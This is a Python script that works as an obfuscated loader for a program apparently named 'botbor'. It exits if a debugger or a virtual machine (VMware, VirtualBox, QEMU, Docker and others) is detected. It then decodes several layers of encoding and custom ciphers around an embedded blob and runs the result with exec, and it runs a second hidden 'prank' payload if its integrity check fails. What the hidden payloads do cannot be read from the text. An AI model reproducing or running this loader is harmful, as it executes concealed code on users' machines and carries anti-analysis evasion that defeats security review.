#!/usr/bin/env python3
import base64,zlib,hashlib,sys as _s,os as _o,time as _t,platform as _p

# Anti-debug
def _ad():
  if hasattr(_s,"gettrace") and _s.gettrace():_s.exit(1)
  if _p.system()=="Windows":
    try:
      import ctypes
      if ctypes.windll.kernel32.IsDebuggerPresent():_s.exit(1)
    except:pass
  try:
    if "PYDEVD" in str(_s.modules) or "pydevd" in str(_s.modules):_s.exit(1)
  except:pass
_ad()

# Anti-VM
def _av():
  vm_indicators=["vmware","virtualbox","qemu","xen","docker","hyperv"]
  try:
    bios="".join(open(p).read().lower() for p in ["/sys/class/dmi/id/sys_vendor","/sys/class/dmi/id/board_vendor"] if _o.path.exists(p))
    for v in vm_indicators:
      if v in bios:_s.exit(1)
  except:pass
_av()

# Decoder
def _D(x,k):
  kl=len(k)
  return bytes(x[i]^k[i%kl]for i in range(len(x)))

def _AES_D(data,key):
  box=list(range(256))
  ksum=sum(key)
  for i in range(256):
    j=(box[i]+key[i%len(key)]+ksum)%256
    box[i],box[j]=box[j],box[i]
  # Build reverse box
  rbox=[0]*256
  for i in range(256):rbox[box[i]]=i
  result=bytearray()
  prev=key[0]
  for b in data:
    orig=rbox[b]
    result.append(orig^prev)
    prev=b
  return bytes(result)

_K1=[167, 147, 75, 112, 130, 109, 87, 138, 56, 76, 33, 245, 211, 232, 25, 108, 180, 47, 122, 193, 94, 150, 13, 131]
_K2=[107, 57, 88, 50, 109, 80, 55, 118, 76, 52, 110, 81, 56, 119, 82, 49]
_K3=[131, 13, 150, 94, 193, 122, 47, 180, 108, 25, 232, 211, 245, 33, 76, 56, 138, 87, 109, 130, 112, 75, 147, 167]

_P="c-qZY-D=w~6u$RUoVXWBAaT>>t`N4cAGVf-()O}o6#Li~u_YtP>%!RmE>~DqD1<TCll2Mq2s?68*J&GAy3$oRa;&5CN#Bul^lde^3$3=tTx_HG0QuA;QuH0ybq^F169{C8pc8p2;50!2T4pE(f>9hb7zrVkUB=RQ`IOuop5;;*&{N$3Nk79g>;Qp<GIN{|Bk*$z-D>YTKt*bg`Wnny%^=lH;E`<-EJGL!pealfFx3cTMW&kV(kWM5m{$G23vfC6b~*d{RG)MA)^yKc^Fm&C16_Xqa`Ty;|9xv^yVs~y<gZ}Xw$CnBTdF0SKLB3>o3CrHP4?{G(OubL^R?_BW~_y4?W=D17yRWK%$MD&uexEi(<bl_wxi239K9OC{_D{Y4i1N-{RaI0@$2XRn$kPLVO&g@&4YysaFHIFPPw-k(9y!(dV(%OmO#k6C`z~xMNA{Gj0x}YsO_<G)Ig3|*H%}Fy{sf9>=;tUMdR^i^qv)vvkBw&ase**^LqllOqhWeGLt!r)083&$CzTQShgWhAxtrWkmZDz@&E;0OB0;J)JErM_||*W{dn<&FT1&W`<^bVEf@+Rr<?*7NQ!4j%AzzxQURw`wn`z!R=)$i4s>^xBH<b<a!(YUpHeZ9Feyp|>-UL&_B_w+0E%$n(mP5EoeYjuf$a*ziV;tzh<R&gC7^3Sdjz?3UC-#S)HYyHWn8cnFp4lRy0q5ROk<&Dt_fMnevNXC>kVOqK_a0`vdcX=>Gk`8+iaHuqefGWyW(6U+Vh^(rdw^Gy+Rw9@G!J%vD=0bX*tR{F(n`pc;3zZ_J$^_kl4{->_CjyCm>QpzB*oago#*q_>r4dukAP#5Z|})@O`WAT;I<qt@ysXAb+I|oj+<=!G-"

# Reconstruct data
_c0="c-jH$5)|!ChZdFPqTkK-G5Umh_a^xHL%LV}>QKD5TocY&1>iuB`9vf#<~+$B-f9g&eZAmH%^T`VJ-jO`66{0mWOidCB!c;|O1z@MeRwJYnt9e@t`tdtv%Cvy>?RO^(E)v*Yka02W4oA^CLQMaaa68dHCL24R7HQvp@ApYYROUIb8@CBs~r_YV-r~#J)YJM`Jf;iD(SY_g8kpL?Z*u5!C4tG|LpRX7z0vYK~~|@^$V{&=IpgqTe3$SkSLY)O-uq|7ai$j?N<E5RjSaK+pe<V?LKkf?S&J42d?}-GoZ5Ld*vHc4Nt=3H8CqfsvTu<3QDrAer>(fO&>hrRUo1Cy+IO(J9FeViC+KW3e4zeJl6a0RH7^JZxs${iKlVI4`Rc)baL_H^|h9Xb<jxO?pG1B6eo}wW0G>UXys`_p61b*dgT?u^H7JRmMVF!oRM-<D_JIqD7SCR(jwNz^ut~x+9qb4<DwBG0@WJ-^$Ie%Sst53pQw65n|~}a#$H!fwu#ndfYO*h0M$|?`Pq)=Q88^{FXig2r<as23#(+ohdcEZbW{V|fa2R}4GjvBW?p4YUlRVwm}JdVt5DhWT^KwFi9E@j`G_(On1x>!jD<z+?fmP;fcm78YPY|;bq%jyIYO|cL(-UqN|&Nyu>L|C7CU(1Xv8l~ENnG-zP>-a-VvJE<R%4xgr7bQx+Yn0sXYy{TJkC;dXF`Iu0^s(sj*Y8bVm~t<O1&we8T7aata>!Vq+-&do+tdmz9Dk>|d>_fO4Hm0c3-Zqt=P|AGU#by%-j)?<f-0sR?T)`AXch{tFxSuMyvJ=%aq7(h96KC(MFqg~&Avm>b{+Z1+V3x`mN}Z?jCn6h0#G-h0yL*$9JW+O(?4#4!T_6rz(obat~T*HJ007>)q>1e&DDQ*f%Xd}fiVkC2LoY1+-bvma8GYQSHywbou!oL?|7w(lnSNZXm*Djr8)Yryvf-n|VtF>H`;*yMJ1V~OQRnApes)iwYf(}QPM`+ciT%xXb@KlX0QQX$1|=WRCkt>63O7x{P3M@`dy#`AkNie^5<XWM%yBe0)0@IDCO*)TrvktdaE+!W3mERG|k@xh1P5Jt_nR^>lYeKyXjed8b@2ys=ANn%w(kl_z$r$4$LSQ$vZIS*lMAyc1F2^J?m;1@if-R*74GO_XBWi=J(c)E^2V-4Ox7$p?<_LQ&{pE$jgf3x>cv3`e0fg78dOPx=7+BmwmA~APdl5ei0?t8=OI%`Zd3{YF%%~p<cqMXg{JBpD{>U-Yl&5G+~41>5iudkN%txpiA(QmFmAS6tW+rDY_O8-U6U6awh&H=ooZz(U${GxG9^3b%AOTJu4H4*8K&C!74D;mXA`jnZLsj9}2RW>u_4#>f(SuSTqG$pnkY={g5V;TIHP5Do5>tds5`;39;XWvA(w;buy50SHFsg5Dr1aJ=xe?<^F_<*a$k##vcB=eRl>oFa68S2{9K18NpyH$lG7r`)B9n4Kk`v|{Hx<t-U53_VhaR4zG^ZdvVoiw(M693UkHHVp~&QYe`Wmh4AGo>IVz6_h{p}aQ(lQ-Sp-9bVIz{2M*Qm0CVz{w2?;NI0e74;^o(QiJ9pW%MUa05U5X((m@h%G|}9qD*H4YtjS5`-jdqrHfm3|q~hUhYp6x0Rk`b-ovuS?DBe$Y|NyPn-JA*{o8%YjaR<yWcxf4~|};?q01g!TuOR`3LUf@syr~OH11~i&z8`TaB5v;irZiL{{%;I!OX=Xg0dmDk=5c1F5VpioHV*iR{RME&02)ds|pO+*p!TCZkd!<BYq?5(N1ur{W|kyGJw+6K7E$OpumgyrY+b*h{BBudn$FOga=p887uJk{O|!2w+Ef@gS@<zrzX!7NZ?`Kyb`txW-X+Amx7X%!pY;$p#5SOftmeTIxluN4IfOo?*!p&Xq3pnt14-MQIpCum-aulje=Y7J+ZuuC&N3r$4Lw&p?;-W+{;CobyElD*`Dx%NfIq@|9iese-_=E9^?1tkW|SJCnItD&K}HNEe63WiWSDz;b3R)D#)M"
_c1="@uuaMbI)31lnlk12)R4<V(kA0Z@i9%4BAgz8}8gUuN=l}$pKge%4PJri2Xyy6&-qv!1m@%$~*Kz)=j2{fC?LmlydrL^TDU{=+M;!%4z_a-N8@zJ6vU;Rgi`xQKe&J_GLjngb$tBiZ6+CUNR%{Ufr4ER$$M>e&2?#u@F2~r>A_*^gO3q>U&oRtXg_H)L+VNC0&!zfj?&8QBGi+>|UY;M{(J@BypmU;-hR4bg|4aPB*iHS6U=JWz_8`D_$c*IO8ic5M&s6cU)z;K#-)<!ZTL`B5B77VdDlQ3S@&H15DK}M8RYr)UpxK!jTzwZ^{H3h$xj227=++*ni+Mpp`er++Ry36_y(-s9FJeFWa>qY~I%vx;nbfLG;``r-f4P-!mZp2vhT-|8R%7c$1uzZuN#M0|Z~}>e<U+W2EQ?5hvgOwf7oAm?Jv(;adHmu6`kLcWn{>$K(Z^a#^N)PZAafstd$@>n)0$@zJ2$)ugYhe-0$?WWs3ZBvH0d_ZkkqIRY4~Uwrz5c$TiDG-IASAltsvC2@u26s9fu?_K`-ORGN{4!2I#h^C22hd?Pp@~w@am$X77@3XwGi!<WM(XM5)w5*{Dyv%cJ(a&sP**hT@fUuHWL6{Y+zt4Gn(ixijX6hX+!L;8iwq=l@qZ!kFCgA;|8;D*5u|nbGZfgQ|Vx!0_X=Z<Q`AD<HvmXN9$wcLXTz^$>k{YR++x9gu5MHKV=z#n)<OXJ?_}{gf*}sy2cOYJa-_Evc;uL85pEitVno`m`J?i1}rjZ6uZDv0vhd4nv4BF9hq~}`NO{X7)n3Nj-w1)UDbmc_@Y`|ZL!aQF>oX0QaMWv|rKs%%2Nw&(F&*Vi0&;AegWL{0)K8q6~CX<i%1Tr77Rt<{Fsj28_+DX>&Oiy0_hR8&SDxBK*??sYXj`0r3RTU_cko_%7hqUeJYyveh9<VyNl%g~5d-}m8w#}G(mEFT<FN*ymnQ!2utDNxSI7h!siW$_kO183^YP;tq<_yddE7F_^AYLOwIO8j6qWC(VlM3GM+&J7o8BKg@{?2{Q*0e|5waL)PWg3GvA?g(Y)+BanV!|}nz-t`B^8d(&QdSQ6L)tBU*{(xWkR8ed-Z;?NnsOsVj__jFBdlA@9uuhK{Yv?9w#}ewAys{!<kNGmoqwHvTA_}ZOoa0rCP>1^!&+0@lcg4eGs>FV4}MZLsW`$b1FNk<GzIU&fC_^f5_U}9FJ7Bf95#<7H{6nBb#XYc3u!on`=lK$!Qa4j`Gro*xdI%d^Njm?5HEt|RRZ#8B<X~{p|8=lrXto0lKY_4{mU0$mIut@X%cXzjI0}W2s8bvyhsRHnKmrcNQM^I0B~PS+mLACTwiV_qtyJjD>S+^W!tc1pLJAW=>qR)8`$iE27JV_a1RpTuR<iTt-4x{Tn`m#H#N{-Qgs+Kz!c<?x>)IlUoK4F2_Iqdp$Cy%(Db&3<@e{ba3N-;&~?uGD0Se&^^l(o`AXdP1hZ%UPh44u4^{5dF8k~0S`Ik-_T`*Gj^x&UB?BHJ1?&*aZ%wPXnkumh%X>wsjmI6Zd)RwxiZxKhvjdtv+H??CtMQZa*>5W9+q8K)*?4R{+6u;R*yI5uIlz3G-WvlS>IO8YF(pd^KY6{D&gLrJrB@JH6#@>m-+9Jzua8{rOET^*`YB0f^&F#3_qU;0L8np%;=#3}zpc7jLb%#EJ6yAm^v3-(ifD>=)K&=!uMWP4G?M%F@1IVW&m;l%0nsyn)x&Sste!rDwetr<@zh!kA@yPv%4*PD1IC><4`KK<CD3_yi7)=ivAx@Tp+z1dnyrIr>$GExm<-c%s$Y`Ldbmv9U@e_ofg?mhkXpI_{~DX$7-hZmW+{;CoDQc6$ps|#Lp9#N@fqWE#CuEzRd710zkzj#FWsH`74He`jV&HX3$KRU0=kL#VFmO-J4dKF15hZR&P;op0#m6^`zA7$-ota!3}Q+FAVC_{NA-jCtbQ1dPpt1)TPvN_2yng5*$UHAP8hj8d;+Y-DxTCUf@!<6SO!2e?mCI|tqqgeoG<=f"
_c2="h$_w|q|+s!<gCmX@CXz^AiakA#SaK8fv8_0h8cK)a?QKou`}ZDT4`MS_QPK~jMOclVulviUxw@Q9wl(RytAB8st*DH%4I*XusYQcppcJ6{uu&6IBZErT9TPy9hI!nX6hXsHxKETA8r!vlH!1$E+8YWd8X7C7nWXqlaDh1oZ(5_U(Xc~U~&0hq*Z8~eq!}xu68|t95#<7H{6nBbquCQ`|c%?h)!rJoWsmK)CnYcuGx80=ECN;D>Nx;ll0x44Cq?)<)t45?Is*6wx!FY*~uUw2ys=AN!t1@zNp0?=^g2|t`3SF=Y!#Q)N{gkq>lmqu`#_L%slcL^#fLPhxQgCQ8mO-D*~t$9hz@eF?r&}q!E1^Ay6`eyzQ*j+WXYBC<Gera<|c_Uu?b9Gi^B)EY;^VB^f!_y*eyr$&kD1rQw-l75Io*3P$L7)Fce;o6Pj5Zp;YG%6roEh7>v|b6WMy<Y*!=%M+>8(;@J&XVB@%f1K9Jy;-64X-r+rvuic-DM8@+#h*@>YcA#6*l#&{Vq#Yc6zgf5;=U0jJDb{igGH5KscjSy#{ZQCGhQP@IO8iYveW1u=l4Z*sN4|JZg4iO?`=ZQSwKzzYWjON%ZYFbAop|=$!OagD*b1^a+-sSg!Lx{%=$&O0qHB;4igqQ_5)oQ5!zLwktd_X?EOWo?sXU#1?)&;sjcQ!loB|+6FM^-70%XRifKgGOjpeem<-H_b?AVnp_&YvCCE3LfkdBNk7|u~DQK6j{=-G=^v2Oq=ZAcO!cF+o-M*{lNyrm=?A@?>_p+fL`A=m6sI8lK2S3?KL?Yjb3AjQOUY>;VGF%v@frXlyFZKA;id9X-EyaSmaRn(%g9?(rjdMh4Ha%?rBu%su2CS&K`omu|%w~}50b*J3F5`tAUHxaia+_2CcUxji^6p$p6}KmUpk@BUR>V_THFhqfhFF?7g?`h|m^j>A1D)%^+-)Y|Tod|&2t)rpwR+;Xx>)$@Clb(SDZOc#U*2bB`A87UY52RzH#7i*Md}b{k}M#=yevR}iK56c%YXiU*Yr+U3)qvWuAo>>1Jqh}P9Fjbn28c}XVRQ37D$u=sxMW5V1(+F8xE6sd4F9?jLpgAzner6;*A!=A!0Xky@w%R)+vU^)LKAxLMEKi-@5gBc{1le-Ye(=OZ1#bVS5qOjz<`$FAAkL_1vKylvOTI#uCYa5^@&_sgjDd{40yMv0{yQmE)LE0|GUnl&=*;)~?EeHa3qXi%Uj-sK*??!B|J~?@guPz;lq2$dxY7vOio?US}|$3cMwak7`K_H1O!NH*g3rUfht+gvZ0<*+f4Dc8d`UN6{l!+_t~#K^auIZD526qo(8<)e=v;d<^)=m;JO+z0%lG?R_<*+F4N5ikX5_@on(cfRv&}prss(HpWE?pPU>*c|;Z^4!>o_-V}2}V$<NG!gO_@zPggDFM0{+H0OG^JZ)v~>8I`%Yc(MulIz%8V>{53L|{t_6j2H)zCZth7&0dL{(C=4eW5^=qewOfX^AuuHQL;3l_<K_!(W{%9DKyN`hpQJQU#q*2SAR;KE9D_enGMZr-b+7Yp}ejSz;Y#>?X;^gl|5Hc{4tdh$sXA6UDo<Ey6vkni7}uv4xO-PJ%nggd^x5$gPi=T-j}*Yk3dLrImo7J6VN9HkKvu+cX^XVN#254B;3Mha)%}h?&P!*Yw@*O-ewle3T&<w*epSXTAH!Dp^RWGs>FV4}LMG9<ENrvYlypvS7DwbWuwwisUXPJThii#9OaTI5ixZI1*yY^v9)Hm*ksBo<eu=B;|R`9;=qtu%+?TZ|qR8Xb+N!Q%CcP`u>ayV|lUs`pH{>zlGoJ^!-t?SH^_}BK4STJ<0gC(TwG&!M<PrBJM?xcIoou{crf$EnU_O4+dg`w!}S<a+WJ9xQO~J$_f=e_gTbT^>C-fKD&l#5Z(E3uCwR-+{YPfX|=vxbbZ|~^GzXtC}v!)O%wO><=|t3E&03Z0~V5dh2i+hAKk$cth(0uZC*Ov!GO<7PCFiec}FoA^MgD&y^NAaKNK46"
_c3="@DR{kG|+$uex$_A6CHRv$-Pc+NIC!04sFSE#Jb`$($dsvS>;6>H|mD!WutdNFXgjBaS;"
_E=_c0+_c1+_c2+_c3

# Main
try:
  _z=base64.b85decode(_E)
  _x=zlib.decompress(_z)
  _x=_D(_x,_K3)
  _x=_AES_D(_x,_K2)
  _x=_D(_x,_K1)
  _p=_x.decode()
  if _p[:4]=="#IB:":
    _ib=_p[4:28]
    _c=_p[29:]
    _ch=hashlib.sha256(("botbor-v3-secure-2024"+_c+"botbor-v3-secure-2024").encode()).hexdigest()[:16]
    _ch2=hashlib.md5((_c+"botbor-v3-secure-2024").encode()).hexdigest()[:8]
    if _ib!=_ch+_ch2:
      # TAMPERED - show prank
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"));_s.exit(0)
  exec(compile(_p,"<botbor>","exec"))
except Exception as _e:
  # Only prank on integrity failure, show real error otherwise
  _em=str(_e).lower()
  if any(x in _em for x in ["decode","decompress","integrity","utf","codec"]):
    try:
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"))
    except:print("\n  [FATAL] Source integrity FAILED. Contact @machine_id_bot");_s.exit(1)
  else:
    raise